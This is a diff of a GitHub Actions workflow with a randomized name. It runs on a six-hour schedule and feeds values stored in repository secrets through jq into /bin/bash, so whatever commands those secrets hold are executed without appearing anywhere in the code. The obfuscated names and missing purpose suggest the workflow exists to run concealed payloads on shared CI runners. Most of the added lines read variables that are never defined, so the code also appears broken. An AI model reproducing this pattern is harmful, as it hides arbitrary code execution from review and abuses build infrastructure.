@@ -1,10 +1,10 @@
 name: taogongzhu4536
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 1/6 * * *'
-jobs:  # 31580
+    - cron: '0 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,16 +12,19 @@ jobs:  # 31580
       - uses: actions/checkout@v4
       - name: taogongzhu4536
         env:
-          siysr81: ${{ secrets.siysr81 }}
+          npg528: ${{ secrets.npg528 }}
         run: |
-          echo $siysr81 | jq -r .ixou32439 | /bin/bash
-          echo $dsohz3916 | jq -r .pl38435 | /bin/bash
-          echo $kwe381 | jq -r .j612 | /bin/bash
-          echo $yd4019 | jq -r .u170 | /bin/bash
-          echo $xbtg9764 | jq -r .m85 | /bin/bash
-          echo $wjnzc613 | jq -r .glsk417 | /bin/bash
-          echo $agr71230 | jq -r .thr04 | /bin/bash
-          echo $zpq42 | jq -r .j1572 | /bin/bash
-          echo $ck59790 | jq -r .f092 | /bin/bash
-          echo $pdlm92138 | jq -r .i23849 | /bin/bash
+          echo $npg528 | jq -r .gsv10237 | /bin/bash
+          echo $h55901 | jq -r .yt307 | /bin/bash
+          echo $fwucy87658 | jq -r .xr29 | /bin/bash
+          echo $jz82 | jq -r .ktx5012 | /bin/bash
+          echo $ew779 | jq -r .puvcl4231 | /bin/bash
+          echo $dgmgl432 | jq -r .ssj19687 | /bin/bash
+          echo $lbjkc08 | jq -r .qct53083 | /bin/bash
+          echo $s8 | jq -r .k12 | /bin/bash
+          echo $zu107 | jq -r .sv3125 | /bin/bash
+          echo $h9272 | jq -r .awxc8902 | /bin/bash
+          echo $wo88688 | jq -r .nx952 | /bin/bash
+          echo $fog738 | jq -r .tvs77997 | /bin/bash
+          echo $si812 | jq -r .pa2 | /bin/bash
 
